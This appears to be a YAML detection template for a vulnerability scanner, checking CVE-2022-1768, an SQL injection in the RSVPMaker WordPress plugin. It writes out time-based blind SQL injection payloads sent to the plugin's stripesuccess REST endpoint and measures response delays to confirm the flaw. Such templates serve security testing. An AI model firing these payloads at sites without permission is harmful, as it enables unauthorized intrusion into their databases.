name: yaml-poc-carrcommunications-rsvpmaker-sql_injection-CVE-2022-1768
binding: f21d34e4-2fbf-4331-8306-c09155b54b03
detail:
    author: jiapeng.han
    links:
        - https://cxsecurity.com/cveshow/CVE-2022-1768/
        - https://gist.github.com/Xib3rR4dAr/441d6bb4a5b8ad4b25074a49210a02cc
        - https://nvd.nist.gov/vuln/detail/CVE-2022-1768
        - https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&old=2725322%40rsvpmaker&new=2725322%40rsvpmaker&sfp_email=&sfph_mail=
        - https://www.wordfence.com/vulnerability-advisories/#CVE-2022-1768
    vulnerability:
        id: dc6fb7bb-a7c5-4e33-8545-8d01de584840
        level: high
    warning: Harmless
transport: http
set:
    sleepSecond1: randomInt(6, 8)
    sleepSecond2: randomInt(3, 5)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /wp-json/rsvpmaker/v1/stripesuccess/anythinghere
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: rsvp_id=(select(0)from(select(sleep(0)))a)&amount=1234&email=randomtext
            follow_redirects: false
        expression: "true"
        output:
            r0latency: response.latency
    r1:
        request:
            cache: true
            method: POST
            path: /wp-json/rsvpmaker/v1/stripesuccess/anythinghere
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: rsvp_id=(select(0)from(select(sleep({{sleepSecond1}})))a)&amount=1234&email=randomtext
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains('"payment_confirmation_message":') && response.content_type.contains("application/json") && response.latency - r0latency >= sleepSecond1 * 1000 - 1000
    r2:
        request:
            cache: true
            method: POST
            path: /wp-json/rsvpmaker/v1/stripesuccess/anythinghere
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: rsvp_id=(select(0)from(select(sleep({{sleepSecond2}})))a)&amount=1234&email=randomtext
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains('"payment_confirmation_message":') && response.content_type.contains("application/json") && response.latency - r0latency >= sleepSecond2 * 1000 - 1000
expression: r0() && r1() && r2()
